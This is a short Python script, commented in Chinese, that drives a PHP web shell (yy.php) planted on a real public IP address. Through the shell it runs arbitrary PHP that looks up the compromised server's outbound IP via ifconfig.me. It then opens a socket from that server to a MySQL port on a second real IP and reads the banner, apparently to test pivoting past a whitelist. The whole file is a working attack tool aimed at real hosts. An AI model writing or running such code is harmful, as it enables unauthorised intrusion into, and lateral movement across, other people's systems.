#!/usr/bin/env python3
"""81.70 出网IP + MySQL 白名单测试"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=30):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# 1. 81.70 出网IP (通过 ifconfig.me 或类似)
r = cmd("print_r(file_get_contents('http://ifconfig.me/ip'));", 20)
print("81.70 出网IP:", r.strip()[-40:], flush=True)

# 2. 从 81.70 用 PHP stream_socket_client 带超时连 124.71:3306 (不卡死)
code = '''
$ctx = stream_context_create(array('socket'=>array('connect_timeout'=>5)));
$f = @stream_socket_client('tcp://124.71.142.158:3306', $e, $es, 5, STREAM_CLIENT_CONNECT, $ctx);
if(!$f){print_r('FAIL:' . $es);}else{
  stream_set_timeout($f, 5);
  $h = @fread($f, 100);
  print_r('OK banner:' . bin2hex(substr($h,0,10)));
  fclose($f);
}
'''
r = cmd(code, 30)
print("stream_socket 124.71:3306:", r.strip()[-80:], flush=True)
